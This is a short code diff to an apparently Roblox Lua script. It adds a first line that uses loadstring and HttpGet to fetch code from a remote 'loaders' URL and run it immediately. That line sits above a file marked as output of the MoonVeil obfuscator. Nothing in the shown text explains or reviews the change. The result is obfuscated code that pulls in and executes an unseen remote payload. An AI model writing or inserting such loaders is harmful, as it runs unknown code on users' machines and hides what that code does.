@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://scriptguardian.onrender.com/scriptguardian/files/scripts/loaders/d4a1003951f14c5e88bec43a6861a9ae"))()
 -- This script was generated using the MoonVeil Obfuscator v1.2.2 [https://moonveil.cc]
 
 local Ka,m,Ma,va=pairs,type,getmetatable,table.unpack;
